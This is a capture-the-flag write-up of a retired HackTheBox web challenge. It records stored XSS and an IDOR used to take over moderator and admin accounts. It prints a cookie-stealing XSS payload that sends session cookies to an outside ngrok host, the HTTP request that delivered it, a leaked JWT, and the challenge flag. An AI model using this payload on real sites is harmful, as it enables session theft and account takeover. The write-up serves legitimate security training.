---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Retired: true
Status: 3. Complete
tags:
  - IDOR
  - insecure-password-change
  - XSS
---
>[!quote]
> *The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?*****


# Set up

No setup, the challenge is started on-demand.

# Information Gathering

- Browsed the home page:
    
    ![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007.png)
    
- Browsed the login page:
    
    ![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%201.png)
    

# The Bug

- Cross Site Scripting
- IDOR

# Exploitation

XSS payload:

```jsx
<img src=x onerror=this.src='https://bfd1-93-51-54-187.eu.ngrok.io/?'+document.cookie;>
```

Sent the payload to moderators and leaked a cookie:

```
POST /api/tickets/add HTTP/1.1
Host: 157.245.33.77:30340
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://157.245.33.77:30340/
Content-Type: application/json
Origin: http://157.245.33.77:30340
Content-Length: 101
Connection: close

{"message":"<img src=x onerror=this.src='https://bfd1-93-51-54-187.eu.ngrok.io/?'+document.cookie;>"}
```

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%202.png)

```
?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI3MjE3MDN9.arGluuqoLIj6d8GVrrKd_i1ECdd5mPGHaf4NSrCe3-g
```

Decoded JWT token:

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%203.png)

Logged in using the leaked session cookie:

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%204.png)

Changed moderator password:

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%205.png)

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%206.png)

Exploited an Insecure Direct Object Reference to change admin password and login:

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%207.png)

![Untitled](../../zzz_res/attachments/Kryptos%20Support%201b16a44d24a142dfb8da5d4ea11f1007%208.png)

# Flag

>[!success]
>`HTB{x55_4nd_id0rs_ar3_fun!!}`

